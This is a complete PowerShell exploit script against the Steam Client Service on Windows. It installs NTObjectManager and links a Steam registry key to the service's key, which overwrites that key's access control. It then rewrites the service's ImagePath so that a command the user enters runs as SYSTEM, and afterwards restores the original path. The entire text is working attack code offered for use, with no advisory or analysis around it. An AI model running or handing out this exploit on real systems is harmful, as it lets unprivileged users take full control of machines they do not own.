$cmd = Read-Host -Prompt 'Enter the command you wish to execute as system'
Write-Host "[*] Installing NTObjectManager..."
install-module NTObjectManager -Scope CurrentUser -Force
import-module NTObjectManager
Write-Host "[*] Creating Registry Symbolic Link from HKLM:\SOFTWARE\WOW6432Node\Valve\Steam\Apps\PrivEsc to HKLM:\SYSTEM\CurrentControlSet\Services\Steam Client Service"
[NtApiDotNet.NtKey]::CreateSymbolicLink("\Registry\Machine\SOFTWARE\WOW6432Node\Valve\Steam\Apps\PrivEsc",$null, "\REGISTRY\Machine\SYSTEM\CurrentControlSet\Services\Steam Client Service")
Write-Host "[*] Registry Symbolic link created, restarting the Steam Client Service"
Get-Service "Steam Client Service" | Restart-Service
Write-Host "[*] Sleeping 5 seconds"
Start-Sleep 5
Write-Host "[*] DACL on HKLM:\SYSTEM\CurrentControlSet\Services\Steam Client Service will be overwritten"
Write-Host "[*] Modifying the Binary Path on the Steam Client Service..."
Set-ItemProperty -Path "HKLM:\SYSTEM\CurrentControlSet\Services\Steam Client Service" -Name "ImagePath" -Value "C:\Windows\System32\cmd.exe /c $cmd"
Write-Host "[*] Binary Path overwritten, restarting the service to trigger EoP. This will error out, just ignore it"
Get-Service "Steam Client Service" | Restart-Service
Write-Host "[*] Done, the command $cmd has been executed"
Write-Host "[*] Attemtping to remove leftovers and restarting steam service"
Set-ItemProperty -Path "HKLM:\SYSTEM\CurrentControlSet\Services\Steam Client Service" -Name "ImagePath" -Value "`"C:\Program Files (x86)\Common Files\Steam\SteamService.exe`" /RunAsService"
Get-Service "Steam Client Service" | Restart-Service
Get-Service "Steam Client Service"
Write-Host "[*] Done."